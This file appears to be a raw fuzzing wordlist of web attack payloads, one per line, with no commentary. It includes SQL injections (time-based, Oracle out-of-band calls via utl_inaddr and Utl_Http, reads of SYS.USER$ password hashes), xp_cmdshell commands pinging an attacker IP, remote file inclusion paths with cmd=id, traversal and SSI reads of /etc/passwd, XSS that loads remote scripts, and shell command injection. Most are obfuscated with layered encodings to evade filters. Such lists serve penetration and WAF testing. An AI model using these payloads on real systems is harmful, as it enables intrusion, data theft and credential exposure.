+'%23qPqxffDiqyx%0Aor%23NEbljEUTyl%0A%23ODebMp%0A3=3
+%u002F%u0077%u0065%u0062%u0061%u0076%u0069%u0073%u002F%u0063%u006C%u0061%u0073%u0073%u002F%u0063%u006C%u0061%u0073%u0073%u002E%u0070%u0068%u0070%u003F%u0072%u006F%u006F%u0074%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+%/%v%b%/%i%n%c%l%u%d%e%s%/%f%u%n%c%t%i%o%n%s%.%p%h%p%?%c%l%a%s%s%f%i%l%e%=%X%X%p%a%t%h%X%X
+L3NwYXcvc3Bhd19jb250cm9sLmNsYXNzLnBocD9HTE9CQUxTW3NwYXdfcm9vdF09WFhwYXRoWFg=
+' AND 1 LIKE utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT LIKE 5)) AND 'i' LIKE 'i
+%252F%252E%252E%255c%252E%252E%255c%252E%252E%255c%252E%252E%255c%252E%252E%255c%252E%252E%255c%252E%252E%255c%252E%252E%255c%257B%2546%2549%254C%2545%257D
+(select%23jMDPzOT%0Acount(*)%23QgiipPgwYyG%0Afrom%23oHpQRoZsXqP%0Ardb$fields%23YtXzPkw%0Aas%23YEaNNRYFFLYY%0At1,rdb$types%23JWfbdQE%0Aas%23lzADpVR%0At2,rdb$collations%23ZjhHZbIdBfjE%0Aas%23JORXJMvDmw%0At3)
+&lt;OBJECT+classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param+name=url+value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
+/phpCards.header.php?CardPath=XXpathXX? and '0having'='0having'
+%/%b%i%n%g%o%s%e%r%v%e%r%.%p%h%p%3%?%r%e%s%p%o%n%s%e%_%d%i%r%=%X%X%p%a%t%h%X%X
+or%23cqppsXJP%0A1=1%23MRmFfs%0Aor%23TwIqwpp%0A%23jfNTzVcQA%0A""=
+%2F%69%6E%64%65%78%2E%70%68%70%3F%74%68%65%6D%65%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
+%u002F%u006C%u0069%u0062%u002F%u0061%u0064%u0064%u0072%u0065%u0073%u0073%u0062%u006F%u006F%u006B%u002E%u0070%u0068%u0070%u003F%u0047%u004C%u004F%u0042%u0041%u004C%u0053%u005B%u0062%u0061%u0073%u0065%u0064%u0069%u0072%u005D%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%"%)%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%)%20%w%a%i%t%f%o%r%20%d%e%l%a%y%20%'%0%:%0%:%2%0%'%20%-%-
+%C0%AFadministrator%C0%AFcomponents%C0%AFcom%C0%DFmosmedia%C0%AFincludes%C0%AFpurchase%C0%AEhtml%C0%AEphp%C0%BFmosConfig%C0%DFabsolute%C0%DFpath%C0%BFXXpathXX
+%252F%2567%2565%256E%2565%2570%2569%252E%2570%2568%2570%253F%2574%256F%2570%2564%2569%2572%253D%2558%2558%2570%2561%2574%2568%2558%2558
+&lt;!--&#91;if+gte+IE+4&#93;&gt;
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' ---- sp_password
+/forum/search.php?repertorylevel=XXpathXX? and '0having'='0having'
+anything'%09OR%0D'x'='x
+%C0%AF%C0%FE%C0%FE%C0%AF6
+%2F%73%74%72%2E%70%68%70%3F%70%3D%58%58%70%61%74%68%58%58
+%u002F%u0063%u006F%u0072%u0065%u002F%u0061%u0064%u006D%u0069%u006E%u002F%u0063%u0061%u0074%u0065%u0067%u006F%u0072%u0069%u0065%u0073%u005F%u0072%u0065%u006D%u006F%u0076%u0065%u002E%u0070%u0068%u0070%u003F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u0075%u0072%u006C%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+y--%0A'--%0Aor--%0A2--%0Abetween--%0A1--%0Aand--%0A5
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--%00
+/web/BetaBlockModules/NetworkModerateUserModule/NetworkModerateUserModule.php?path_prefix LIKE XXpathXX
+ping -i 30 127.0.0.1%00
+%2F%69%6E%64%65%78%2E%70%68%70%3F%70%61%67%65%6E%61%6D%65%3D%58%58%70%61%74%68%58%58
+'  or  1/*
+/tools/update_translations.php?_SESSION[path%23TyyOODMOHvg%0A]=XXpathXX?
+L2luZGV4LnBocD90aGVtZXBhdGg9WFhwYXRoWFg/
+JyBBTkQgMT11dGxfaW5hZGRyLmdldF9ob3N0X2FkZHJlc3MoKFNFTEVDVCBESVNUSU5DVCh0YWJsZV9uYW1lKSBGUk9NIChTRUxFQ1QgRElTVElOQ1QodGFibGVfbmFtZSksIFJPV05VTSBBUyBMSU1JVCBGUk9NIHN5cy5hbGxfdGFibGVzKSBXSEVSRSBMSU1JVD0yKSkgQU5EICdpJz0naQ==
+%/%0%x%2%e%0%x%2%e%0%x%2%f%0%x%2%e%0%x%2%e%0%x%2%f%{%F%I%L%E%}
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+%/%w%e%b%/%B%e%t%a%B%l%o%c%k%M%o%d%u%l%e%s%/%G%r%o%u%p%M%o%d%e%r%a%t%e%C%o%n%t%e%n%t%M%o%d%u%l%e%/%G%r%o%u%p%M%o%d%e%r%a%t%e%C%o%n%t%e%n%t%M%o%d%u%l%e%.%p%h%p%?%p%a%t%h%_%p%r%e%f%i%x%=%X%X%p%a%t%h%X%X
+"+ if(benchmark(3000000,MD5(1)),   NULL   ,   NULL   ),   NULL   )%20/*
+%2522%252B%2569%2566%2528%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%252C%254E%2555%254C%254C%2529%2520%252D%252D
+%' %A%N%D %1%=%u%t%l%_%i%n%a%d%d%r%.%g%e%t%_%h%o%s%t%_%a%d%d%r%e%s%s%(%(%S%E%L%E%C%T %D%I%S%T%I%N%C%T%(%c%o%l%u%m%n%_%n%a%m%e%) %F%R%O%M %(%S%E%L%E%C%T %D%I%S%T%I%N%C%T%(%c%o%l%u%m%n%_%n%a%m%e%)%, %R%O%W%N%U%M %A%S %L%I%M%I%T %F%R%O%M %a%l%l%_%t%a%b%_%c%o%l%u%m%n%s%) %W%H%E%R%E %L%I%M%I%T%=%3%)%) %A%N%D %'%i%'%=%'%i
+%/%A%C%G%V%n%e%w%s%/%h%e%a%d%e%r%.%p%h%p%?%P%a%t%h%N%e%w%s%=%X%X%p%a%t%h%X%X
+/oneadmin/blogger/sampleblogger.php?/*!path*/[docroot]=XXpathXX?
+%256F%2572%2520%2531%253D%2531%2520%252D%252D
+&%23YnGotKQH%0Aping%23QXSaqRNdD%0A-i%23kjLhGYX%0A30%23aOgtxNJpJn%0A127.0.0.1%23QvmUrbJJxOYV%0A&
+JyBvciAndGV4dCcgPSBuJ3RleHQn
+L21haW4vbWFpbi5waHA/cGk9WFhwYXRoWFg=
+'/**/or/**/userid/**/like/**/'%
+/skin/gold/template.php?p/**/a/**/th=XXp/**/a/**/thXX
+/mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]=XXpathXX-- sp_password
+Or 4479=4479--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20%EF%BC%870:0:20%EF%BC%87%20/*
+%00%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND %00%27i%00%27=%00%27i
+%' %u%n%i%o%n %s%e%l%e%c%t %1%, %'%<%u%s%e%r%-%f%i%e%l%d%n%a%m%e%>%'%, %'%<%p%a%s%s%-%f%i%e%l%d%n%a%m%e%>%' %1%-%-
+and /*!301770=benchmark(3000000,MD5(1))%20%23*/
+//.//\\//.//.//\\//.//.//\\//.//.//\\//.//{//etc//inir.d//}
+%' %o%r %2 %b%e%t%w%e%e%n %1 %a%n%d %3
+;waitfor delay %bf%270:0:__TIME__'--
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00
+%/%B%e%t%a%B%l%o%c%k%M%o%d%u%l%e%s%/%L%o%g%o%M%o%d%u%l%e%/%L%o%g%o%M%o%d%u%l%e%.%p%h%p%?%p%a%t%h%_%p%r%e%f%i%x%=%X%X%p%a%t%h%X%X
+%C0%AFconfig%C0%AFconfig%C0%DFmember%C0%AEphp%C0%BFINC%C0%BFXXpathXX%C0%BF
+L2Fubm9uY2UucGhwP3BhZ2U9WFhwYXRoWFg/JmNtZD1pZA==
+%$%+%|%+%D%i%r%+%c%:%\
+/event.php?myevent_path=XXpathXX and '0having'='0having'
+<IMG%23TctQSAX%0ASRC=javascrscriptipt:alert('XSS')>
+%00%27 waitfor delay %00%270:0:20%00%27 /*
+'%0CAND%0B1=utl_inaddr.get_host_address((SELECT%0DCOUNT(DISTINCT(PASSWORD))%0CFROM%09SYS.USER$))%09AND%0A'i'='i
+/libsecure.php?abs_path=XXpathXX?-- sp_password
+hi%EF%BC%87 or 1=1 --
+%u002F%u0074%u0068%u0065%u006D%u0065%u002F%u0074%u0065%u0073%u0074%u0036%u002E%u0070%u0068%u0070%u003F%u0072%u006F%u006F%u0074%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/...\...\...\...\...\{FILE}
+%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%0%' %/%*
+%C0%AA%C0%AAand%C0%AA0%C0%BFbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%20%C0%AF%C0%AA
+Ly4uJXUyMjE1Li4ldTIyMTUuLiV1MjIxNS4uJXUyMjE1Li4ldTIyMTUuLiV1MjIxNXtGSUxFfQ==
+%2563%256F%2575%256E%2574%2528%252F%2563%2568%2569%256C%2564%253A%253A%256E%256F%2564%2565%2528%2529%2529
+/modules/downloads/lib/LM_Downloads.php?pathToIndex=XXpathXX-- sp_password
+%252F%2561%2564%256D%2569%256E%2570%2561%256E%2565%256C%252F%2569%256E%2563%256C%2575%2564%2565%2573%252F%2561%2564%2564%255F%2566%256F%2572%256D%2573%252F%2561%2564%2564%256D%2570%2533%252E%2570%2568%2570%253F%2547%254C%254F%2542%2541%254C%2553%255B%2572%256F%256F%2574%255F%2570%2561%2574%2568%255D%253D%2558%2558%2570%2561%2574%2568%2558%2558
+y%EF%BC%87 AND 1=(SELECT COUNT(*) FROM tabname); --
+/sources/template.php?CONFIG[main_path] LIKE XXpathXX
+&lt;!--#e/**/x/**/ec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+%252F%2573%2530%2534%252E%2570%2568%2570%253F%2573%2568%256F%2570%2569%2564%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+/admin/lib_action_step.php?GLOBALS[CLASS_PATH]=XXpathXX%00
+/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}%00
+&lt;IMG%03LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
+%2F%2E%5C%5C%2E%2E%5C%5C%2E%5C%5C%2E%2E%5C%5C%2E%5C%5C%2E%2E%5C%5C%2E%5C%5C%2E%2E%5C%5C%2E%5C%5C%2E%2E%5C%5C%2E%5C%5C%2E%2E%5C%5C%7B%46%49%4C%45%7D
+<SCRIPT "a=%EF%BC%87>%EF%BC%87" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+L2NvbnRhY3QucGhwP2Jsb2dfdGhlbWU9WFhwYXRoWFg=
+<!--# exec  cmd="mail Foobar@email.de <mailto:Foobar@email.de> < cat /etc/passwd" --><br/>
+x' or 1=1 or 'x'='y
+%2578%2578%2578%2525%252D%2531%2541%256F%2572%2525%252D%2531%2544%2531%253D%2531
+/include.php?path=psp/user.php&site=XXpathXX and '0having'='0having'
+/prepare.php?xcart_dir=XXpathXX?
+/files/folder- rename   .php3?BSX_LIBDIR=XXpathXX
+JiN4MDAwMDNjOw==
+/  mod  /special/index.php?config[pathMod]=XXpathXX
+%2573%2565%256C%2565%2563%2574%2520%2567%2572%2561%256E%2574%2565%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%2563%2561%2574%252E%2564%2562%2561%2575%2574%2568%253B
+%u002F%u006D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0063%u0065%u0072%u0074%u0069%u006E%u0066%u006F%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u0066%u0075%u006C%u006C%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%2F%77%70%2D%63%61%63%68%65%2D%70%68%61%73%65%31%2E%70%68%70%3F%70%6C%75%67%69%6E%3D%58%58%70%61%74%68%58%58
+0 or 1=1%00
+/mutant_includes/mutant_functions.php?phpbb_root_path LIKE XXpathXX
+%2F%70%68%70%34%79%6F%75%2E%70%68%70%3F%64%69%72%3D%58%58%70%61%74%68%58%58%3F
+/ea-gBook/index_inc.php?inc_ordner LIKE XXpathXX?&act LIKE cmd&cmd LIKE whoami&d LIKE /&submit LIKE 1&cmd_txt LIKE 1
+/files/carprss.php?CarpPath=XXpathXX and '0having'='0having'
+/index.php?Section=XXpathXX
+%2F%6C%61%74%65%78%2E%70%68%70%3F%62%69%62%74%65%78%72%6F%6F%74%72%65%6C%3D%58%58%70%61%74%68%58%58%3F
+“><ScRiPt>alert(document.cookie)</script>
+%252F%256D%2569%256E%2564%256D%2565%256C%2564%252F%2569%256E%2563%256C%2575%2564%2565%252F%2573%2565%256E%2573%256F%2572%2579%252E%2569%256E%2563%252E%2570%2568%2570%253F%254D%254D%255F%2547%254C%254F%2542%2541%254C%2553%255B%2568%256F%256D%2565%255D%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+/xarg_corner_top.php?xarg=XXpathXX?
+%2F%63%6F%6E%66%69%67%2E%70%68%70%3F%66%75%6C%6C%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
+; /*!00000id*/
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+exec master..xp_cmdshell %00%27ping+<attackerip>%00%27
+'   union   +  select   +UTL_INADDR.get_host_address, null   , null   , null   , null   +  from + dual  每
+/xt_counter.php?server_base_dir=XXpathXX%00
+'))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A--
+' /*!30740AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i*/
+%C0%AElt%C0%BBSCRIPT%C0%AA%C0%BF%C0%DE%C0%AA%C0%AEgt%C0%BB%C0%DE%C0%AA%C0%AASRC%C0%BF%C0%DE%C0%AAhttp%C0%AE%C0%AB58%C0%BB%C0%AF%C0%AFha%C0%AE%C0%AB46%C0%BBckers%C0%AE%C0%AB46%C0%BBorg%C0%AFxss%C0%AE%C0%AB46%C0%BBjs%C0%DE%C0%AA%C0%AEgt%C0%BB%C0%AElt%C0%BB%C0%AFSCRIPT%C0%AEgt%C0%BB
+'+or+2+between+2+and+5
+L2FwcHNlcnYvbWFpbi5waHA/YXBwc2Vydl9yb290PVhYcGF0aFhY
+b3IgMD0wICMi
+%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u0044%u0049%u0052%u005F%u0050%u004C%u0055%u0047%u0049%u004E%u0053%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/_administration/securite.php?cfg[document_uri]=XXpathXX-- sp_password
+%u002F%u0062%u006F%u006F%u006B%u0073%u002F%u0068%u006F%u006D%u0065%u002E%u0070%u0068%u0070%u003F%u0068%u006F%u006D%u0065%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+|/bin/ls%23CtsRKqEpOqwz%0A-al
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygna3JiX3NlcnZlcl9rZXlmaWxlJyk7
+%252F%2562%2569%2562%256C%2569%256F%2574%2565%2563%2561%252F%2562%2569%2562%255F%2570%256C%2564%2565%2574%2561%2569%256C%2573%252E%2570%2568%2570%253F%2543%254C%2541%2553%2553%2550%2541%2554%2548%253D%2558%2558%2570%2561%2574%2568%2558%2558
+/global.php?abs_path=XXpathXX?-- sp_password
+%u002F%u0073%u0075%u0072%u0076%u0065%u0079%u0073%u002F%u0073%u0075%u0072%u0076%u0065%u0079%u002E%u0069%u006E%u0063%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%C0%AFpodcastgen1%C0%AE0beta2%C0%AFcore%C0%AFadmin%C0%AFlogin%C0%AEphp%C0%BFabsoluteurl%C0%BFXXpathXX
+/source/mod%23VUyXmfqzfaH%0A/rss/view%23XBVRjeVALDM%0A.php?Codebase=XXpathXX
+%2F%75%73%72%2F%65%78%74%65%6E%73%69%6F%6E%73%2F%67%65%74%5F%69%6E%66%6F%63%68%61%6E%6E%65%6C%2E%69%6E%63%2E%70%68%70%3F%72%6F%6F%74%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F%63%6D%64%3D%69%64%3B%70%77%64
+/lib/selectlang.php?BBC_LANGUAGE_PATH=XXpathXX
+%2F%64%70%5F%6C%6F%67%73%2E%70%68%70%3F%48%6F%6D%65%44%69%72%3D%58%58%70%61%74%68%58%58
+/..///..///..///..///..///..///{FILE} and '0having'='0having'
+%252D%2531%2525%252D%2531%2541%254F%2572%2525%252D%2531%2544%252D%2531%253D%252D%2531
+L2luZGV4LnBocD9iYWNrPVhYcGF0aFhY
+%2F%74%65%6D%70%6C%61%74%65%73%2F%64%65%66%61%75%6C%74%2F%69%6E%64%65%78%5F%6C%6F%67%67%65%64%2E%70%68%70%3F%6D%61%69%6E%5F%6C%6F%61%64%65%64%3D%31%26%63%75%72%5F%6D%6F%64%75%6C%65%3D%58%58%70%61%74%68%58%58
+&lt;IMG%23FJOKzwqjb%0ADYNSRC=\"javascript&#058;alert('XSS')\"&gt;
+%C0%DEx00
+/.\\..\\.\\..\\{/etc/inir.d/}
+%2526%2523%2530%2530%2530%2530%2536%2530%253B
+%/%i%n%d%e%x%.%p%h%p%?%c%o%n%f%i%g%_%a%t%k%r%o%o%t%=%X%X%p%a%t%h%X%X
+/%c0%ae%c0%ae%c1%9c{FILE}-- sp_password
+%/%i%n%c%/%h%e%a%d%e%r%.%i%n%c%.%p%h%p%?%f%i%c%S%t%y%l%e%=%X%X%p%a%t%h%X%X
+WFhYWFhgcGVybCAtZSAncHJpbnQgIi4lcCIgeCA4MCdg
+/\\/\\ss/\\/\\ss/\\/\\/\\/\\/\\/\\{/\\/\\etc/\\/\\passwd}
+/include/pear/ITX.php?basepath LIKE XXpathXX?
+'%09or%0C1%0Bin%09(select%0B@@version)--
+%<%!%[%C%D%A%T%A%[%<%s%c%r%i%p%t%>%v%a%r %n%=%0%;%w%h%i%l%e%(%t%r%u%e%)%{%n%+%+%;%}%<%/%s%c%r%i%p%t%>%]%]%>
+"%07and%040=benchmark(3000000,MD5(1))%20/*
+999999)))%23bSFSDHEcMBO%0Aor%23qCiGJNxpyQOk%0A%23uzLucz%0A1=1%23hCQtpTzof%0Aor%23OEaQzCU%0A%23HtPjyXdSkBW%0A(((1
+/display.php?path%23JHTMHxVP%0A=XXpathXX
+' /*!30157AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i*/
+/forum/message.php?repertorylevel LIKE XXpathXX?
+/axoverzicht.cgi?maand=XXpathXX-- sp_password
+'),nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl)%20waitfor%20delay%20'0:0:20'%20--
+),(  select %20if(   count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+x%bf%27 AND 1=(SELECT COUNT(*) FROM tabname); --
+'||Utl_Http.request('http://<yourservername>')--LDvcRd%0Afrom--XDGJETVCKYNp%0Adual--
+/.//,,//.//,,//.//,,//.//,,//.//,,//{/etc/inir.d/}
+%20%6F%72%20%78%3D%78
+<frameset onload=alert(123)> and '0having'='0having'
+&lt;STYLE&gt;@im\port%EF%BC%87\ja\vasc\ript&#58;alert(\"XSS\")%EF%BC%87;&lt;/STYLE&gt;
+waitfor--hvMAWryIZDTF%0Adelay--AXocWFSWVtn%0A'0:0:20'--altPwxs%0A/*
+%C0%AF0x2e0x2e%C0%DE0x2e0x2e%C0%DE0x2e0x2e%C0%DE0x2e0x2e%C0%DE0x2e0x2e%C0%DE%C0%FBFILE%C0%FF
+Ly4uJTVjLi4lNWMuLiU1Y3tGSUxFfQ==
+'%23fftBOmBiVuJj%0Aor%23AcTMewGz%0A4479=4479--
+%C0%AA%C0%AAor%C0%AA%C0%AFW%C0%AF%C0%BF%C0%AFW%C0%AF%C0%AA%C0%AF%C0%AF
+%u002F%u0077%u0065%u0062%u002F%u0042%u0065%u0074%u0061%u0042%u006C%u006F%u0063%u006B%u004D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0047%u0072%u006F%u0075%u0070%u004D%u006F%u0064%u0065%u0072%u0061%u0074%u0065%u0043%u006F%u006E%u0074%u0065%u006E%u0074%u004D%u006F%u0064%u0075%u006C%u0065%u002F%u0047%u0072%u006F%u0075%u0070%u004D%u006F%u0064%u0065%u0072%u0061%u0074%u0065%u0043%u006F%u006E%u0074%u0065%u006E%u0074%u004D%u006F%u0064%u0075%u006C%u0065%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u005F%u0070%u0072%u0065%u0066%u0069%u0078%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%u002F%u0063%u006F%u006D%u0070%u006F%u006E%u0065%u006E%u0074%u0073%u002F%u0063%u006F%u006D%u005F%u0076%u0069%u0064%u0065%u006F%u0064%u0062%u002F%u0063%u006F%u0072%u0065%u002F%u0076%u0069%u0064%u0065%u006F%u0064%u0062%u002E%u0063%u006C%u0061%u0073%u0073%u002E%u0078%u006D%u006C%u002E%u0070%u0068%u0070%u003F%u006D%u006F%u0073%u0043%u006F%u006E%u0066%u0069%u0067%u005F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/classes/core/language.aspx?rootdir=EEpathEE
+%/%m%c%N%e%w%s%/%a%d%m%i%n%/%h%e%a%d%e%r%.%p%h%p%?%s%k%i%n%f%i%l%e%=%X%X%p%a%t%h%X%X
+/admin/admin.php?site_url=XXpathXX%00
+%2F%6F%6C%62%6F%6F%6B%6D%61%72%6B%73%2D%30%2E%37%2E%34%2F%74%68%65%6D%65%73%2F%74%65%73%74%31%2E%70%68%70%3F%58%58%70%61%74%68%58%58
+/o/**/rd/**/er/login.php?svr_rootscript=XXpathXX
+/\\/\\./\\/\\../\\/\\./\\/\\../\\/\\./\\/\\../\\/\\{/\\/\\etc/\\/\\passwd}
+%20%64
+%2F%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%25%32%65%25%32%65%5C%7B%46%49%4C%45%7D
+%2F%77%65%62%61%76%69%73%2F%63%6C%61%73%73%2F%63%6C%61%73%73%2E%70%68%70%3F%72%6F%6F%74%3D%58%58%70%61%74%68%58%58%3F
+Ly4uLy4uLy4uLy4uLy4uLy4uL3tGSUxFfQ==
+'%23hrhjNhZfQpwk%0Aor%23KNbImp%0A%23mpdMxyDgbU%0A1=1%23UeGGHtGK%0A/*
+LTE=
+/BetaBlockModules/ImagesMediaGalleryModule/ImagesMediaGalleryModule.jsp?current_blockmodule_path=$$path$$
+999999))/*!0or 1=1/*!0or ((1=1
+Ly4uXFwuLlxcLi5cXC4uXFwuLlxcLi5cXC4uXFwuLlxce0ZJTEV9
+/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././,,/{/etc/passwd}
+/addvip.php?msetstr["PROGSDIR"]=XXpathXX-- sp_password
+';/*!exec*/master..xp_cmdshell 'ping 172.10.1.255'--
+PGZvcm0gaWQ9InRlc3QiIC8+PGJ1dHRvbiBmb3JtPSJ0ZXN0IiBmb3JtYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KDEyMykiPlRFU1RIVE1MNUZPUk1BQ1RJT04=
+/direct.php?rf=XXpathXX-- sp_password
+\x00-- sp_password
+%252F%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%257B%2546%2549%254C%2545%257D
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+",NULL%09)%20waitfor%20delay%20'0:0:20'%20--
+y' AND 1=(SELECT COUNT(*) FROM tabname); --
+%C0%AF%C0%AAor%C0%AA2%C0%AAbetween%C0%AA1%C0%AAand%C0%AA5
+9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999
+/auth/auth.php?phpbb_root_path LIKE XXpathXX
+y ' or 119 > 30000001 and '0having'='0having'
+%C0%AFengine%C0%AFapi%C0%AFapi%C0%AEclass%C0%AEphp%C0%BFdle%C0%DFconfig%C0%DFapi%C0%BFXXpathXX%C0%BF
+%' %o%r %'%s%o%m%e%t%h%i%n%g%' %= %'%s%o%m%e%'%+%'%t%h%i%n%g%'
+/themes/header.php?theme_directory=XXpathXX%00-- sp_password
+%2526%2523%2578%2530%2530%2533%2563%253B
+%u0023%u0020%u0063%u0075%u006C%u006C%u0065%u0064%u0020%u0079%u006F%u0075%u0020%u006D%u0061%u0079%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0061%u0064%u0064%u0020%u0061%u0020%u0071%u0075%u0065%u0073%u0074%u0069%u006F%u006E%u0020%u006D%u0061%u0072%u006B%u0020%u0074%u006F%u0020%u0079%u006F%u0075%u0072%u0020%u006F%u0077%u006E%u0020%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u0020%u0055%u0052%u004C%u003A
+perl--%0A-e--%0A'print--%0A\"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";'--%0A&gt;--%0Aout
+LzB4MmUweDJlMHgyZjB4MmUweDJlMHgyZjB4MmUweDJlMHgyZjB4MmUweDJlMHgyZjB4MmUweDJlMHgyZjB4MmUweDJlMHgyZntGSUxFfQ==
+/beacon/language/1/splash.lang.php?languagePath=XXpathXX-- sp_password
+%252F%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%255C%257B%2546%2549%254C%2545%257D
+and 0=benchmark(3000000,MD5(1))%20--
+%u002F%u0064%u0062%u002F%u0050%u006F%u006C%u006C%u0044%u0042%u002E%u0070%u0068%u0070%u003F%u0043%u004F%u004E%u0046%u0049%u0047%u005F%u0044%u0041%u0054%u0041%u0052%u0045%u0041%u0044%u0045%u0052%u0057%u0052%u0049%u0054%u0045%u0052%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+L2NvbnRyb2xsZXJzL1ZpZGVvQ29udHJvbGxlci5waHA/YmFzZURpcj1YWHBhdGhYWA==
+%26%23%36%30
+/./ss/./ss/./ss/./ss/./ss/./ss/{/etc/inir.d/}
+LyV1ZmYwZSV1ZmYwZSV1MjIxNSV1ZmYwZSV1ZmYwZSV1MjIxNSV1ZmYwZSV1ZmYwZSV1MjIxNXtGSUxFfQ==
+<IMG%0ESRC=javascript:alert('XSS')>
+9999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'9999 and '0having'='0having'
+L2luZGV4LnBocD9wYWdlPVhYcGF0aFhYPw==
+<body onscroll LIKE alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+/include/classes.php?INCLUDE_DIR=XXpathXX?
+%&%#%x%0%0%0%0%3%c%;
+o/**/r%201=1 --
+/anzagien.php?config[root_ordner]=XXpathXX?cmd=id%00
+%u002F%u002E%u002E%u0025%u0063%u0030%u0025%u0061%u0066%u002E%u002E%u0025%u0063%u0030%u0025%u0061%u0066%u002E%u002E%u0025%u0063%u0030%u0025%u0061%u0066%u002E%u002E%u0025%u0063%u0030%u0025%u0061%u0066%u007B%u0046%u0049%u004C%u0045%u007D
